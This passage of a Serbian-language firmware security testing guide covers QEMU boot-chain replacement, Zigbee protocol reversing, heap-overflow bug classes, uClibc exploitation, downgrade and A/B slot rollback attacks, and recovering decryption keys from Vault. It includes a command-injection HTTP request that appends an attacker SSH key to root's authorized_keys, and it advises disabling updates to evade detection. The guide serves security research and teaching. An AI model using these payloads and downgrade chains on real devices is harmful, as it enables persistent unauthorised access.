Kada analitičar kontroliše QEMU kernel, initramfs i virtuelne diskove, izmenjeni root može da se pokrene zamenom proizvođačevog PID 1 za verifikaciju malim statički povezanim init-om. Ovo je **zamena boot lanca u laboratorijskom okruženju**, a ne probijanje dm-verity, njegovog RSA potpisa, Secure Boot-a ili ključa zaštićenog TPM-om.<sup>[[11]](#references)</sup>

Zamenski init treba da oponaša operativne delove originalnog boot postupka: montira `devtmpfs`, pozove `setsid()`, poveže `/dev/console` sa deskriptorima datoteka 0–2, montira `/proc` i `/sys`, sačeka isporučeni blok uređaj, montira izmenjeni root samo za čitanje, odvoji pseudo-sisteme datoteka starog root-a, premesti novo montiranje na `/`, izvrši `chroot` i pozove `execve()` nad originalnim firmware-ovim `/sbin/init`. Odvajanje `/dev`, `/proc` i `/sys` **pre** `MS_MOVE` sprečava slučajno odvajanje tačaka montiranja koje pripadaju novom root-u.<sup>[[11]](#references)</sup>

Promenljivo stanje uređaja držite odvojeno od izmenjenog nepromenljivog root-a. qcow2 overlay može da sačuva LVM stanje originalnog diska, dok drugi virtio disk montiran samo za čitanje obezbeđuje izmenjeni SquashFS:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Otklanjanje grešaka u stanju oflajn slike

Pregledajte trajno stanje izvan gosta kada sporo pokretanje, destruktivne skripte pri pokretanju ili nepouzdano evidentiranje na konzoli otežavaju otkrivanje uzroka greške. Nikada ne priključujte overlay koji koristi pokrenuta VM; izložite ga pomoću `qemu-nbd`, ograničite LVM otkrivanje na namenjenu NBD particiju i deaktivirajte grupu volumena pre nego što je odvojite.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Za ponovljivu izolaciju kvarova, upisujte vremenski označene datoteke sa markerima na stabilan volumen na koji može da se upisuje i proveravajte ih van mreže; `/dev/kmsg`, FIFO datoteke i prolazne konzole mogu dati lažno negativne rezultate zbog ograničavanja učestalosti ili ranog gašenja procesa. Takođe, uporedite tačne interfejse između slojeva pre nego što menjate nepovezan kôd: `uname -r` naspram `/lib/modules/`, funkcije ext4 na disku naspram konfiguracije kernela i generaciju Mesa `libGL` naspram ABI-ja DRI drajvera i naziva drajvera izvedenih iz PCI podataka. Komponenta može da postoji, pa čak i da se uspešno učita pomoću `dlopen()`, a da i dalje ne može da se koristi jer njen potrošač očekuje drugačiji ABI.<sup>[[11]](#references)</sup>

## Dinamička analiza u praksi

U ovoj fazi se za analizu koristi stvarno ili emulirano okruženje uređaja. Neophodno je zadržati pristup shell-u operativnom sistemu i sistemu datoteka. Emulacija možda neće savršeno oponašati interakcije sa hardverom, pa će povremeno biti potrebno ponovo pokrenuti emulaciju. Tokom analize treba ponovo pregledati sistem datoteka, iskoristiti izložene veb-stranice i mrežne servise i istražiti ranjivosti bootloader-a. Provere integriteta firmware-a ključne su za otkrivanje potencijalnih ranjivosti tipa backdoor.

## Tehnike analize tokom izvršavanja

Analiza tokom izvršavanja podrazumeva interakciju sa procesom ili binarnom datotekom u njenom operativnom okruženju, uz korišćenje alata kao što su gdb-multiarch, Frida i Ghidra za postavljanje breakpoints i otkrivanje ranjivosti putem fuzzing-a i drugih tehnika.

Za embedded ciljeve bez potpunog debuggerskog alata, **kopirajte statički povezani `gdbserver`** na uređaj i povežite se sa njim udaljeno:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Mapiranje Zigbee / radio-ko-procesorskih poruka

Na IoT čvorištima RF stek je često podeljen između **radio MCU-a** i Linux procesa u korisničkom prostoru. Koristan postupak je mapiranje putanje:<sup>[[8]](#references)</sup>

1. **RF frame** u vazduhu
2. **parser kontrolera** na radio MCU-u
3. **serijski/UART tekstualni ili TLV protokol** prosleđen Linux-u (na primer `/dev/tty*`)
4. **dispečer aplikacije** u glavnom daemone-u
5. **rukovalac specifičan za protokol / mašina stanja**

Ova arhitektura daje dva cilja za reverzni inženjering, umesto jednog. Ako kontroler pretvara binarne radio frejmove u tekstualni protokol kao što je `Group,Command,arg1,arg2,...`, utvrdite:

- **grupe poruka** i dispečerske tabele
- Koje poruke mogu doći sa **mreže**, a koje od samog kontrolera
- Tačna **polja za razlikovanje specifična za proizvođača** (na primer Zigbee `manufacturer_code` i prilagođeni `cluster_command`)
- Koji su rukovaoci dostupni samo tokom **commissioning-a**, otkrivanja ili faza preuzimanja firmware-a/modela

Konkretno za Zigbee, snimite pairing saobraćaj i proverite da li se cilj i dalje oslanja na podrazumevani **Link Key** `ZigBeeAlliance09`. Ako je tako, prisluškivanje commissioning saobraćaja može otkriti **Network Key**. Zigbee 3.0 install codes smanjuju ovu izloženost, pa zabeležite da li ih testirani uređaj zaista primenjuje.

### Rukovaoci protokolima specifičnim za proizvođača i dostupnost ograničena FSM-om

Komande Zigbee/ZCL specifične za proizvođača često su bolji cilj od standardizovanih klastera, jer vode do **prilagođenog koda za parsiranje** i internih **FSM-ova** sa manje proverenom validacijom.<sup>[[8]](#references)</sup>

Praktičan postupak:

- Reverznim inženjeringom pratite dispečer komandi dok ne pronađete **rukovalac dostupan samo proizvođaču**.
- Utvrdite tabele za **FSM stanje**, **događaj**, **proveru**, **akciju** i **sledeće stanje**.
- Identifikujte **prelazna stanja** koja automatski napreduju, kao i grane za ponovni pokušaj/grešku koje na kraju resetuju ili oslobađaju stanje pod kontrolom napadača.
- Potvrdite koje su legitimne razmene protokola potrebne da bi daemon dospeo u ranjivo stanje, umesto da pretpostavite da je ranjivi rukovalac uvek dostupan.

Kod protokola osetljivih na tajming, ponovno slanje paketa iz Python framework-a može biti presporo. Pouzdaniji pristup je emulacija legitimnog uređaja na stvarnom hardveru (na primer **nRF52840**) uz stek namenjen proizvođačima, kako biste izložili odgovarajuće **endpoints**, **attributes** i tajming commissioning-a.

### Klasa grešaka u fragmentiranim preuzimanjima u ugrađenim daemon-ima

Ponavljajuća klasa firmware grešaka javlja se u **fragmentiranim preuzimanjima blob/model/configuration datoteka**:<sup>[[8]](#references)</sup>

1. **Prvi fragment** (`offset == 0`) čuva `ctx->total_size` i alocira `malloc(total_size)`.
2. Naredni fragmenti proveravaju samo polja paketa koja kontroliše napadač, kao što je `packet_total_size >= offset + chunk_len`.
3. Kopiranje koristi `memcpy(&ctx->buffer[offset], chunk, chunk_len)` bez provere u odnosu na **prvobitno alociranu veličinu**.

Napadač može da pošalje:

- Prvi ispravan fragment sa **malom** deklarisanom ukupnom veličinom da bi iznudio malu alokaciju na heap-u.
- Kasniji fragment sa **očekivanim offset-om**, ali većim `chunk_len`.
- Falsifikovanu veličinu lokalnu za paket koja prolazi nove provere, ali ipak prepisuje prvobitno alocirani bafer.

Kada je ranjiva putanja iza commissioning logike, exploit mora da uključi dovoljno **emulacije uređaja** da bi cilj pre slanja neispravnih fragmenata dospeo u očekivano stanje preuzimanja modela ili blob-a.

### Pokretanje `free()` kroz protokol

U ugrađenim daemon-ima, najlakši način za pokretanje eksploatacije metapodataka heap-a često nije „čekanje na čišćenje“, već **izazivanje sopstvene obrade grešaka protokola**:<sup>[[8]](#references)</sup>

- Pošaljite neispravne naredne fragmente da biste FSM prebacili u stanja **ponovnog pokušaja** ili **greške**.
- Premašite prag za ponovne pokušaje kako bi daemon **resetovao kontekst** i oslobodio oštećeni bafer.
- Iskoristite ovo predvidljivo `free()` da pokrenete primitive na strani alokatora pre nego što se proces sruši iz nepovezanih razloga.

Ovo je naročito korisno protiv alokatora nalik na **musl/uClibc/dlmalloc** u ugrađenom Linux-u, gde korumpiranje metapodataka chunk-a može pretvoriti unlink/unbin logiku u primitivu za upis. Stabilan obrazac je korumpiranje **polja size** radi preusmeravanja prolaska alokatora na **lažne chunk-ove postavljene unutar bafera koji je prekoračen**, umesto trenutnog prepisivanja stvarnih bin pokazivača i rušenja procesa.

## Eksploatacija binarnih datoteka i proof-of-concept

Razvoj PoC-a za identifikovane ranjivosti zahteva duboko razumevanje arhitekture cilja i programiranje u jezicima nižeg nivoa. Zaštite binarnog runtime-a su retke u ugrađenim sistemima, ali kada postoje, mogu biti potrebne tehnike kao što je Return Oriented Programming (ROP).

### Napomene o uClibc fastbin eksploataciji (ugrađeni Linux)

- **Fastbins + konsolidacija:** uClibc koristi fastbins slične onima u glibc-u. Kasnija velika alokacija može pokrenuti `__malloc_consolidate()`, pa svaki lažni chunk mora proći provere (razumna veličina, `fd = 0` i okolni chunk-ovi koji se smatraju „zauzetim“).<sup>[[6]](#references)</sup>
- **Binarne datoteke koje nisu PIE, uz ASLR:** ako je ASLR omogućen, ali glavna binarna datoteka **nije PIE**, adrese unutar binarne datoteke u `.data/.bss` su stabilne. Možete ciljati oblast koja već liči na ispravno zaglavlje heap chunk-a kako biste usmerili fastbin alokaciju na **tabelu pokazivača na funkcije**.
- **NUL koji zaustavlja parser:** prilikom parsiranja JSON-a, `\x00` u payload-u može zaustaviti parsiranje, a da pritom zadrži završne bajtove pod kontrolom napadača za stack pivot/ROP chain.
- **Shellcode preko `/proc/self/mem`:** ROP chain koji poziva `open("/proc/self/mem")`, `lseek()` i `write()` može postaviti izvršivi shellcode u poznato mapiranje i skočiti na njega.

## Pripremljeni operativni sistemi za analizu firmware-a

Operativni sistemi kao što su [AttifyOS](https://github.com/adi0x90/attifyos) i [EmbedOS](https://github.com/scriptingxss/EmbedOS) obezbeđuju unapred podešena okruženja za bezbednosno testiranje firmware-a, opremljena potrebnim alatima.

## Pripremljeni OS-ovi za analizu firmware-a

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS je distribucija namenjena bezbednosnoj proceni i pentestingu Internet of Things (IoT) uređaja. Štedi mnogo vremena tako što obezbeđuje unapred podešeno okruženje sa svim potrebnim alatima.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): operativni sistem za testiranje bezbednosti ugrađenih sistema, zasnovan na Ubuntu 18.04 i unapred opremljen alatima za testiranje bezbednosti firmware-a.

## Napadi vraćanjem firmware-a na stariju verziju i nebezbedni mehanizmi za ažuriranje

Čak i kada proizvođač implementira proveru kriptografskog potpisa firmware slika, **zaštita od vraćanja na stariju verziju (downgrade) često izostaje**. Kada boot ili recovery loader proverava samo potpis pomoću ugrađenog javnog ključa, ali ne upoređuje *verziju* (ili monotoni brojač) slike koja se upisuje, napadač može legitimno instalirati **stariji, ranjivi firmware sa važećim potpisom**, čime se ponovo uvode zakrpljene ranjivosti.<sup>[[4]](#references)</sup>

Uobičajen tok napada:

1. **Nabavite stariju potpisanu sliku**
   * Preuzmite je sa javnog portala za preuzimanje, CDN-a ili stranice za podršku proizvođača.
   * Izdvojite je iz pratećih mobilnih/desktop aplikacija (npr. iz `assets/firmware/` unutar Android APK-a).
   * Pronađite je u repozitorijumima trećih strana kao što su VirusTotal, Internet arhive, forumi itd.
2. **Otpremite ili poslužite sliku uređaju** preko bilo kog dostupnog kanala za ažuriranje:
   * Web UI, API mobilne aplikacije, USB, TFTP, MQTT itd.
   * Mnogi potrošački IoT uređaji izlažu HTTP(S) endpoint-e *bez autentifikacije* koji prihvataju Base64-kodirane firmware blob-ove, dekodiraju ih na serveru i pokreću recovery/nadogradnju.
3. Nakon vraćanja na stariju verziju, iskoristite ranjivost koja je zakrpljena u novijem izdanju (na primer filter za command injection koji je dodat kasnije).
4. Po želji ponovo upišite najnoviju sliku ili onemogućite ažuriranja kako biste izbegli otkrivanje nakon uspostavljanja persistence-a.

### Primer: Command Injection nakon vraćanja na stariju verziju

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

U ranjivom (downgraded) firmware-u, parametar `md5` se direktno nadovezuje na shell komandu bez sanitizacije, što omogućava ubacivanje proizvoljnih komandi (ovde – omogućavanje root pristupa putem SSH ključa). Kasnije verzije firmware-a uvele su osnovni filter znakova, ali odsustvo zaštite od downgrade-a čini ovu ispravku beskorisnom.<sup>[[4]](#references)</sup>

### Izdvajanje firmware-a iz mobilnih aplikacija

Mnogi proizvođači pakuju kompletne slike firmware-a u svoje prateće mobilne aplikacije kako bi aplikacija mogla da ažurira uređaj putem Bluetooth-a/Wi-Fi-ja. Ovi paketi se obično čuvaju nešifrovani u APK/APEX-u, na putanjama kao što su `assets/fw/` ili `res/raw/`. Alati kao što su `apktool`, `ghidra` ili čak običan `unzip` omogućavaju izdvajanje potpisanih slika bez pristupa fizičkom hardveru.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Zaobilaženje zaštite od vraćanja na stariju verziju samo u updater-u kod A/B dizajna slotova

Neki proizvođači zaista implementiraju **ratchet** za zaštitu od vraćanja na stariju verziju, ali samo u logici *updater*-a (na primer, UDS rutina preko CAN-a, komanda za oporavak ili userspace OTA agent). Ako **bootloader** kasnije proverava samo potpis/CRC slike i veruje tabeli particija ili metapodacima slota, zaštita od vraćanja na stariju verziju i dalje može da se zaobiđe.<sup>[[7]](#references)</sup>

Tipičan slab dizajn:

- Metapodaci firmvera sadrže i deskriptor verzije i **security ratchet** / monotoni brojač.
- Updater upoređuje ratchet slike sa vrednošću sačuvanom u trajnoj memoriji i odbija starije potpisane slike.
- Bootloader **ne** parsira taj ratchet i pre pokretanja izabranog slota proverava samo zaglavlje, CRC i potpis.
- Aktivacija slota čuva se zasebno u tabeli particija ili brojaču generacije po slotu i nije kriptografski vezana za tačan digest firmvera koji je proveren.

Time se u sistemima sa dva slota dobija primitva **proveri jednu sliku / pokreni drugu**. Ako napadač može da natera updater da označi slot B kao sledeće odredište pokretanja pomoću trenutno potpisane slike, a zatim pre ponovnog pokretanja prepiše slot B, bootloader i dalje može da pokrene vraćenu stariju sliku jer veruje samo već potvrđenim metapodacima slota.

Uobičajen obrazac zloupotrebe:

1. Učitajte **trenutni potpisani** firmver u pasivni slot i pokrenite uobičajenu rutinu za proveru/prebacivanje, tako da raspored označi taj slot kao sledeći aktivni.
2. **Nemojte još ponovo pokretati uređaj**. U istoj sesiji ponovo pokrenite rutinu za pripremu/brisanje slota.
3. Zloupotrebite zastarelo stanje pokretanja ili zastarelu logiku izbora slota tako da updater obriše **isti fizički slot** koji je upravo promovisan.
4. Upišite **stariji, ali i dalje potpisani** firmver u taj slot.
5. Preskočite rutinu za proveru koja nameće ratchet i direktno ponovo pokrenite uređaj.
6. Bootloader bira promovisani slot, proverava samo potpis/integritet i pokreće staru sliku.

Šta treba tražiti pri reverse engineering-u A/B implementacija ažuriranja:

- Izbor slota izveden iz **zastavica pri pokretanju** koje se ne osvežavaju nakon uspešnog prebacivanja.
- Rutina nalik na `prepare_passive_slot()`, koja briše slot na osnovu zastarelog stanja umesto **trenutnog potvrđenog rasporeda**.
- Funkcija nalik na `part_write_layout()`, koja samo uvećava **brojač generacije** / aktivnu zastavicu, a ne čuva hash proverene slike.
- Provere ratchet-a implementirane u userspace-u ili updater kodu, ali ne i u ROM-u / bootloader-u / fazama secure boot-a.
- Rutine za brisanje ili oporavak koje ostavljaju slot označenim kao pokretljivim čak i nakon što je njegov sadržaj obrisan i ponovo upisan.

### Kontrolna lista za procenu logike ažuriranja

* Da li je prenos/potvrda identiteta *update endpoint*-a adekvatno zaštićena (TLS + autentifikacija)?
* Da li uređaj pre flešovanja proverava **brojeve verzija** ili **monotoni anti-rollback brojač**?
* Da li se slika proverava unutar secure boot lanca (npr. da li ROM kod proverava potpise)?
* Da li **bootloader nameće isti ratchet** kao updater, umesto da proverava samo potpis/CRC?
* Da li su metapodaci o aktivaciji slota **vezani za digest/verziju proverenog firmvera**, ili se slot može izmeniti nakon promocije?
* Nakon uspešnog prebacivanja slota, da li je uređaj primoran da se ponovo pokrene ili su kasnije rutine za ažuriranje/brisanje i dalje dostupne u istoj sesiji?
* Da li userland kod obavlja dodatne kontrole ispravnosti (npr. dozvoljena mapa particija, broj modela)?
* Da li *delimični* tokovi ažuriranja ili tokovi ažuriranja *rezervne kopije* ponovo koriste istu logiku provere?

> 💡  Ako bilo šta od navedenog nedostaje, platforma je verovatno ranjiva na napade vraćanja na stariju verziju.

## Ranjiv firmver za vežbu

Za vežbanje otkrivanja ranjivosti u firmveru, za početak koristite sledeće projekte ranjivog firmvera.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Oporavak ključeva za dešifrovanje firmvera iz ugrađenog KMS/Vault stanja

Kada slika ažuriranja sadrži malo metapodataka u otvorenom tekstu i veliki blob visoke entropije, prvo analizirajte kontejner, pre nego što pokušate brute-force:<sup>[[1]](#references)</sup>

- Izbacite zaglavlja, ofsete i granice redova pomoću `hexdump`, `xxd`, `strings -tx`, `base64 -d` i `binwalk -E`.
- `Salted__` obično označava OpenSSL `enc` format: narednih 8 bajtova je salt, a preostali bajtovi su ciphertext.
- Base64 polje koje se dekodira u tačno `256` bajtova snažan je nagoveštaj da imate posla sa RSA-2048 ciphertext-om koji sadrži nasumičnu lozinku firmvera ili sesijski ključ.
- Odvojeni PGP materijal u istoj datoteci često štiti samo autentičnost; nemojte pretpostaviti da služi za poverljivost.

Ako potraga za statičkim ključevima (`grep`, `strings`, PEM/PGP pretrage) ne uspe, izvršite reverse engineering **operativnog toka dešifrovanja**, umesto da samo tražite privatne ključeve:

- Dekompajlirajte updater / binarni fajl za upravljanje i pratite ko čita šifrovani blob, koji pomoćni program/API ga dešifruje i koje logičko ime ključa traži.
- Pretražite izdvojeni root filesystem u potrazi za KMS stanjem (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), kao i unit datotekama i init skriptama.
- Tretirajte lozinke u otvorenom tekstu kao što su `vault operator unseal ...`, ključeve za oporavak, bootstrap tokene ili lokalne KMS skripte za automatsko otpečaćivanje kao materijal ekvivalentan privatnim ključevima.

Ako uređaj sadrži originalni Vault binarni fajl i pozadinski sistem za skladištenje, obično je lakše ponovo pokrenuti to okruženje nego ponovo implementirati interne detalje Vault-a:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Sa root pristupom na kloniranom KMS-u:

- Omogućite izvoz transit ključeva samo unutar izolovanog klona: `vault write transit/keys/<name>/config exportable=true`
- Izvezite unwrap ključ: `vault read transit/export/encryption-key/<name>`
- Isprobajte oporavljeni RSA ključ uz tačan par padding/hash koji koristi KMS. Neuspešna dekripcija pomoću PKCS#1 v1.5 i neuspešna podrazumevana OAEP dekripcija **ne** dokazuju da je ključ pogrešan; mnogi tokovi zasnovani na Vault-u koriste OAEP sa SHA-256, dok uobičajene biblioteke podrazumevano koriste SHA-1.
- Ako payload počinje sa `Salted__`, tačno reprodukujte KDF koji koristi proizvođač (`EVP_BytesToKey`, često MD5 na starijim uređajima) pre nego što pokušate AES-CBC dekripciju.

Time „šifrovani firmware“ postaje opštiji problem: **oporavite operativne ključeve na strani uređaja, pa zatim van mreže reprodukujte tačne parametre za unwrap + KDF**.

## Obuke i sertifikati

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Razbijanje firmware-a pomoću Claude-a: veštine na seniorskom nivou, autonomija na juniorskom nivou](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodologija testiranja bezbednosti firmware-a](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Praktično IoT hakovanje: Definitivni vodič za napad na Internet stvari](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Iskorišćavanje zero-day ranjivosti u napuštenom hardveru – blog Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Kako mi je pametni uređaj od 20 dolara omogućio pristup vašem domu](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Sad me vidiš: sad si pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Iskorišćavanje Tesla Wall Connector-a preko konektora za punjenje - 2. deo: zaobilaženje zaštite od vraćanja na stariju verziju](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Neka zatreperi: Iskorišćavanje Philips Hue Bridge-a putem bežičnog ažuriranja](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS na QEMU, 1. deo: raspakivanje](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Dokumentacija Linux kernela - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [ROOT Tesla OS na QEMU, 2. deo: otklanjanje grešaka i popravke](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Dell BIOS lozinke: Slaba XOR enkripcija omogućava oporavak iz SPI fleša (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Alat za oporavak Dell BIOS lozinki](https://github.com/R3n5k1/dellpwn)
- [14] [VoidStar Security — Osvežavanje znanja o hakovanju hardvera, 2. deo](https://voidstarsec.com/blog/brushing-up-part-2)
- [15] [Kako i zašto smo hakovali hardverski novčanik Cypherock: cela priča](https://www.darknavy.org/blog/how_and_why_we_hacked_cypherock_hardware_wallet_the_full_story/)
{{#include ../../banners/hacktricks-training.md}}
